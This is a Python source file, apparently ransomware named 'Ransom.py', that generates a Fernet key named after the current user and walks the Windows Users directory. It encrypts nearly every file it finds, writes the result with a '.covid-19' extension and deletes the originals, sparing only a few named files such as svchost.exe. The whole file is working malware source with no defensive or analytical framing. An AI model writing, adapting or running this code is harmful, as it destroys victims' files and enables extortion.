#!/usr/bin/python
#coding:utf-8
from cryptography.fernet import Fernet
import os
# ENVIRONMENT VARIABLE
usr = os.environ["USERNAME"]
usrkey = "{}.key".format(usr)
# GENERATE KEY FUNCTION
def genkey(name):
    global key
    key = Fernet.generate_key()
    with open(usrkey, "wb") as file:
        file.write(key)
# FILE ENCYPTING FUNCTION
def file_ecrypt(key, name):
    if (name!="Ransom.py"):
        with open(name,'rb') as files:
            data = files.read()

        fernet = Fernet(key)
        encrypted = fernet.encrypt(data)
        encrypted_file = name + ".covid-19"
        try:
            with open(encrypted_file, 'wb') as files:
                files.write(encrypted)

            os.remove(name)
        except:
            pass
# LIST ALL FILES EXTENSIONS AND INVOKE ENCRYPTION FUNCTION
def filelist():
    rep = ['\\Users\\']
    for user in rep:
        for root, dirs, files in os.walk(user):
            for file in files:
                if(file != "GuiCounter.exe" and file != "svchost.exe" and file != "image.jpg"):
                    for ext in file.split("."):
                        try:
                            if file.endswith(ext):
                                ally = os.path.join(root, file)
                                file_ecrypt(key, ally)
                        except PermissionError:
                            pass
                        except:
                            pass
